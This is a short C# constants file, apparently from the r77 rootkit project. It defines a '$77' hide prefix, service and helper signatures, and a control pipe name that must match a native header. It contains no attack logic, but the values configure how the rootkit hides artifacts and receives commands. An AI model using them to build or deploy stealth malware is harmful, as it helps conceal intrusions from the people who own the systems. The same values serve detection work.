namespace Global
{
	// These constants must match the preprocessor definitions in r77def.h
	public static class R77Const
	{
		public const string HidePrefix = "$77";
		public const ushort R77ServiceSignature = 0x7273;
		public const ushort R77HelperSignature = 0x7268;
		public const string ControlPipeName = HidePrefix + "control";
	}
}